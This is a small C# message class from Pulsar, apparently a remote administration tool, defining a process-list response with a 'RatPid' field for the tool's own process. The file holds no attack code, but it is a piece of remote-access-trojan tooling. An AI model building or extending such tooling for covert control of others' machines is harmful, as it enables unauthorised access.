using MessagePack;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class GetProcessesResponse : IMessage
    {
        [Key(1)]
        public Process[] Processes { get; set; }

        [Key(2)]
        public int? RatPid { get; set; }
    }
}
